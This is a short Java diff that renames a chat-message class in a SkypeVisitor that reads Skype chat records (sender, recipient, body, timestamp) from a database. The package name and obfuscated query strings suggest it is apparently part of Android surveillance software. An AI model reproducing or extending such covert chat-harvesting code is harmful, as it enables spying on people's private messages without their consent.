@@ -7,7 +7,6 @@ import android.database.Cursor;
 
 import com.android.networking.Messages;
 import com.android.networking.db.RecordVisitor;
-import com.android.networking.module.submodule.ChatSkype;
 import com.android.networking.util.StringUtils;
 
 public class SkypeVisitor extends RecordVisitor {
@@ -24,7 +23,7 @@ public class SkypeVisitor extends RecordVisitor {
 			Messages.getString("k_10"), Messages.getString("k_11") };
 	private String selection = " id > ";
 
-	ArrayList<ChatMessage> messages;
+	ArrayList<MessageChat> messages;
 	private String account;
 
 	public SkypeVisitor(ChatSkype chatSkype, String account) {
@@ -46,7 +45,7 @@ public class SkypeVisitor extends RecordVisitor {
 		boolean incoming = !account.equals(from);
 
 		if (!StringUtils.isEmpty(body)) {
-			ChatMessage message = new ChatMessage(chatSkype.getProgramId(), timestamp, from, fromDisplay, to,
+			MessageChat message = new MessageChat(chatSkype.getProgramId(), timestamp, from, fromDisplay, to,
 					toDisplay, body, incoming);
 
 			messages.add(message);
@@ -56,7 +55,7 @@ public class SkypeVisitor extends RecordVisitor {
 
 	@Override
 	public void init() {
-		messages = new ArrayList<ChatMessage>();
+		messages = new ArrayList<MessageChat>();
 	};
 
 	@Override
